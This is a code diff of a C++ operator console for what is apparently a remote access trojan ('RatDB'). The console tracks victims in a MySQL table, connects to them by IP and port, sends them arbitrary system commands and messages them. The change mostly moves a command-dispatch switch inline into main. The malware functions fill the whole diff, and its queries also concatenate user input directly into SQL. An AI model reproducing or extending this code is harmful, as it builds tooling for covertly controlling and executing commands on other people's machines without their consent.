@@ -12,19 +12,10 @@
 #include<mysql.h>
 #include "../DataBase/DataBase.h"
 
+#include "../Shared.h"
+
 
 using namespace std;
-
-enum Commands
-{
-	SendSystemCMDToVictim,
-	MessageVictim,
-	Disconnect,
-	ConnectToVictim,
-	ListVictims,
-	Exit,
-	Help
-};
 
 void recvLoop(Single_NetworkHandlerClient* Victim, string name) {
 	while (Victim->IsConnected()) {
@@ -36,84 +27,6 @@ void recvLoop(Single_NetworkHandlerClient* Victim, string name) {
 		}
 	}
 }
-
-bool CommandLoop(Commands c,DataBase DB, Single_NetworkHandlerClient * Victim, string * vicName,thread *recv) {
-	int cols = DB.GetNumColumns("victims");
-	string input;
-	PCSTR ip;
-	PCSTR port;
-	bool loop=true;
-	switch (c)
-	{
-	case Help:
-		UFuncts::printfC("SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
-		printf("\n");
-		break;
-	case SendSystemCMDToVictim:
-		UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
-		getline(cin, input);
-		Victim->SendDataT<string>("CMD");
-		Victim->SendDataT<string>(input);
-		UFuncts::printfC("Returned:", 6, 0, 0, 0);
-		printf("\n");
-		Sleep(1000);
-		break;
-	case MessageVictim:
-		while (loop) {
-			UFuncts::printfC("Enter Message (type \"esc\" to return): ", 5, 0, 0, 0);
-			getline(cin, input);
-			if (input == "esc") {
-				loop = false;
-				continue;
-			}
-			Victim->SendDataT<string>(input);
-			Sleep(2000);
-		 };
-		break;
-	case Disconnect:
-		Victim->DisConnect();
-		recv->join();
-		break;
-	case ConnectToVictim:
-		UFuncts::printfC("Enter name: ", 5, 0, 0, 0);
-		getline(cin, input);
-		*vicName = input;
-		DB.Query("SELECT IP FROM victims where Name='"+input+"'");
-		DB.GetRow();
-		cout << DB.row[0] << endl;
-		
-		ip = DB.row[0];
-
-		DB.Query("SELECT Port FROM victims where Name='" + input + "'");
-		DB.GetRow();
-		cout << DB.row[0] << endl;
-
-		port = DB.row[0];
-
-		Victim->Init(ip, port);
-		Victim->Connect();
-		recv = new thread(recvLoop, Victim, *vicName);
-		break;
-	case ListVictims:
-		system("cls");
-		DB.Query("SELECT * FROM victims");
-		while (DB.GetRow()) {
-			for (int i = 0; i < cols; i++)
-			{
-				UFuncts::printfC("%s ", i+2, 0, 1, 0,DB.row[i]);
-			}
-			cout << endl;
-		}
-		break;
-	case Exit:
-		return false;
-		break;
-	default:
-		break;
-	}
-	return true;
-}
-
 
 int main(int argc, char** argv)
 {
@@ -139,7 +52,7 @@ int main(int argc, char** argv)
 	}
 	int cols = RatDB.GetNumColumns("victims");	
 
-	bool run = false;
+	bool run = true;
 	string input;
 	do
 	{
@@ -150,24 +63,67 @@ int main(int argc, char** argv)
 		UFuncts::printfC("Enter Command: ", 1, 0, 1, 0, RatDB.GetNumRows("victims"));
 		getline(cin, input);
 		if (input=="exit"||input == "Exit") {
-			run = CommandLoop(Exit, RatDB, &Victim, &vicName, &recvThread);
+			run = false;
 		}
 		else if (input == "lsvic" || input == "LsVic") {
-			run = CommandLoop(ListVictims, RatDB, &Victim,&vicName, &recvThread);
+			system("cls");
+			RatDB.Query("SELECT * FROM victims");
+			while (RatDB.GetRow()) {
+				for (int i = 0; i < cols; i++)
+				{
+					UFuncts::printfC("%s ", i + 2, 0, 1, 0, RatDB.row[i]);
+				}
+				cout << endl;
+			}
 		}
 		else if (input == "connect" || input == "Connect") {
-			run = CommandLoop(ConnectToVictim, RatDB, &Victim, &vicName, &recvThread);
+			UFuncts::printfC("Enter name: ", 5, 0, 0, 0);
+			getline(cin, input);
+			vicName = input;
+			RatDB.Query("SELECT IP FROM victims where Name='" + input + "'");
+			RatDB.GetRow();
+			cout << RatDB.row[0] << endl;
+
+			PCSTR ip = RatDB.row[0];
+
+			RatDB.Query("SELECT Port FROM victims where Name='" + input + "'");
+			RatDB.GetRow();
+			cout << RatDB.row[0] << endl;
+
+			PCSTR port = RatDB.row[0];
+
+			Victim.Init(ip, port);
+			Victim.Connect();
+			recvThread = thread(recvLoop, Victim, vicName);
 		}
 		else if (input == "disconnect" || input == "Disconnect") {
-			run = CommandLoop(Disconnect, RatDB, &Victim, &vicName, &recvThread);
+			Victim.DisConnect();
+			recvThread.join();
 		}
 		else if (input == "messagevictim" || input == "MessageVictim") {
-			run = CommandLoop(MessageVictim, RatDB, &Victim, &vicName, &recvThread);
+			bool loop = true;
+			while (loop) {
+				UFuncts::printfC("Enter Message (type \"esc\" to return): ", 5, 0, 0, 0);
+				getline(cin, input);
+				if (input == "esc") {
+					loop = false;
+					continue;
+				}
+				Victim.SendDataT<string>(input);
+				Sleep(2000);
+			};
 		}
 		else if (input == "help" || input == "Help") {
-			run = CommandLoop(Help, RatDB, &Victim, &vicName, &recvThread);
+			UFuncts::printfC("SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
+			printf("\n");
 		}else if (input == "sendsyscmd" || input == "SendSysCmd") {
-			run = CommandLoop(SendSystemCMDToVictim, RatDB, &Victim, &vicName, &recvThread);
+			UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
+			getline(cin, input);
+			Victim.SendDataT<string>("CMD");
+			Victim.SendDataT<string>(input);
+			UFuncts::printfC("Returned:", 6, 0, 0, 0);
+			printf("\n");
+			Sleep(1000);
 		}
 	} while (run);
 
